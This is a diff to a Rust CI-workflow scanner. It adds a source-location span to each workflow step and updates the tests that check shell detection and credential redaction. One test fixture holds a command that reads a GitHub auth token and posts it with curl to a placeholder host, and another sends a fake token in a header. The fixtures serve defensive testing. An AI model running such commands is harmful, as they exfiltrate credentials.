@@ -4,6 +4,7 @@
 //! A step a CI workflow runs, and the shell it runs.
 
 use crate::credential;
+use crate::yaml::Span;
 
 /// One step of one job, as the workflow writes it.
 ///
@@ -19,6 +20,10 @@ pub struct Step {
     /// The shell it runs under, as the workflow decides it: the step's own
     /// `shell`, the nearest `defaults.run.shell`, or the runner's default.
     pub shell: String,
+    /// Where the workflow wrote what it runs. A finding is placed inside this
+    /// rather than by searching the file for the command again, which goes
+    /// wrong wherever the same text is written twice.
+    pub at: Option<Span>,
 }
 
 impl Step {
@@ -31,11 +36,12 @@ impl Step {
     /// goes unreported. A hook's command is judged raw and redacted on its
     /// way into the report, and so is this; [`Step::redacted`] is that step.
     #[must_use]
-    pub fn new(job: &str, run: &str, shell: &str) -> Self {
+    pub fn new(job: &str, run: &str, shell: &str, at: Option<Span>) -> Self {
         Self {
             job: job.to_owned(),
             run: run.to_owned(),
             shell: shell.to_owned(),
+            at,
         }
     }
 
@@ -50,6 +56,7 @@ impl Step {
             job: credential::redacted(&self.job),
             run: credential::redacted(&self.run),
             shell: credential::redacted(&self.shell),
+            at: self.at,
         }
     }
 
@@ -82,7 +89,10 @@ mod tests {
     #[test]
     fn only_a_posix_shell_is_read_as_shell() {
         for shell in ["bash", "sh", "bash -e {0}", "/bin/bash", "/usr/bin/sh"] {
-            assert!(Step::new("a", "echo ok", shell).is_posix_shell(), "{shell}");
+            assert!(
+                Step::new("a", "echo ok", shell, None).is_posix_shell(),
+                "{shell}"
+            );
         }
         for shell in [
             "pwsh",
@@ -94,7 +104,7 @@ mod tests {
             "",
         ] {
             assert!(
-                !Step::new("a", "echo ok", shell).is_posix_shell(),
+                !Step::new("a", "echo ok", shell, None).is_posix_shell(),
                 "{shell}"
             );
         }
@@ -109,6 +119,7 @@ mod tests {
             &format!("deploy-{PAT}"),
             &format!("curl -H 'Authorization: Bearer {PAT}' https://h.invalid"),
             &format!("my-shell --token {PAT} {{0}}"),
+            None,
         )
         .redacted();
 
@@ -126,7 +137,7 @@ mod tests {
     fn a_step_holds_what_the_workflow_wrote_until_it_is_redacted() {
         let run = "TOKEN=$(gh auth token)\ncurl -d \"$TOKEN\" https://h.invalid";
 
-        let held = Step::new("a", run, "bash");
+        let held = Step::new("a", run, "bash", None);
 
         assert_eq!(held.run, run, "judged on what was written");
         // And the report's copy is not that text, which is the whole point of
@@ -138,7 +149,7 @@ mod tests {
     /// what it deploys with.
     #[test]
     fn a_credential_in_a_job_name_is_never_recorded() {
-        let held = Step::new(&format!("push-{PAT}"), "echo ok", "bash").redacted();
+        let held = Step::new(&format!("push-{PAT}"), "echo ok", "bash", None).redacted();
 
         assert!(!format!("{held:?}").contains(PAT), "{held:?}");
         assert!(held.job.starts_with("push-"), "{held:?}");
